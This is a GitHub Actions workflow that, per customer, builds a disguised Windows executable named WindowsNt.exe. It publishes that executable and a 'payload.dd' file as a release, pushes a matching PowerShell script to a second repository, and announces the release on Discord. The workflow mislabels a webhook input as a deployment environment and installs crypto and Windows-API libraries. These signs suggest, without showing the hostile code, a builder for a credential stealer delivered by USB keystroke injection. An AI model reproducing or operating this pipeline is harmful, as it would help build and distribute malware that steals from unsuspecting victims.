name: NEW

on:
  workflow_dispatch:
    inputs:
      client:
        description: 'Your GitHub username'
        required: true
      webhook:
        description: 'Environment for deployment (dev, prod)'
        required: true

jobs:
  build:
    runs-on: windows-latest

    steps:
      - name: Checkout repository
        uses: actions/checkout@v3

      - name: Set up Python
        uses: actions/setup-python@v4
        with:
          python-version: '3.12'

      - name: Install required packages
        run: |
          pip install pip --upgrade
          pip install pywin32 requests pycryptodomex pyinstaller cryptography

      - name: Init everything
        env:
          CLIENT: ${{ github.event.inputs.client }}
          WEBHOOK: ${{ github.event.inputs.webhook }}
          KEY: ${{ secrets.KEY }}
        run: |
          python init.py

      - name: Build exe
        run: |
          pyinstaller --onefile --icon icon.ico -w WindowsNt.py

      - name: Create GitHub Release
        id: create_release
        uses: actions/create-release@v1
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        with:
          tag_name: ${{ github.event.inputs.client }}
          release_name: Release
          draft: false
          prerelease: false

      - name: Upload WindowsNt.exe to release
        uses: actions/upload-release-asset@v1
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        with:
          upload_url: ${{ steps.create_release.outputs.upload_url }}
          asset_path: dist/WindowsNt.exe
          asset_name: WindowsNt.exe
          asset_content_type: application/octet-stream

      - name: Upload payload.dd to release
        uses: actions/upload-release-asset@v1
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        with:
          upload_url: ${{ steps.create_release.outputs.upload_url }}
          asset_path: payload.dd
          asset_name: payload.dd
          asset_content_type: application/octet-stream


      - name: Clone Target Repository
        env:
          REPO_TOKEN: ${{ secrets.REPO_TOKEN }}
        run: |
          git clone https://$env:REPO_TOKEN@github.com/SAKIB-SALIM/f.git
          cd f

      - name: Copy Dynamic File
        run: |
          $fileName = "${{ github.event.inputs.client }}.ps1"
          Copy-Item -Path $fileName -Destination "f/"

      - name: Configure Git
        run: |
          cd f
          git config user.name "GitHub Action"
          git config user.email "action@github.com"

      - name: Commit Changes
        run: |
          cd f
          git add .
          git commit -m "Add ${{ github.event.inputs.client }}.ps1 file via GitHub Actions"

      - name: Push Changes
        env:
          REPO_TOKEN: ${{ secrets.REPO_TOKEN }}
        run: |
          cd f
          git push https://$env:REPO_TOKEN@github.com/SAKIB-SALIM/f.git main


      - uses: sarisia/actions-status-discord@v1
        if: always()
        with:
          webhook: ${{ secrets.UPDATE }}
          description: |
            Tag name `${{ github.event.inputs.client}}`
            Click [here](https://github.com/SAKIB-SALIM/A/releases/tag/${{ github.event.inputs.client }}) to visit!
          color: 0xff91a4
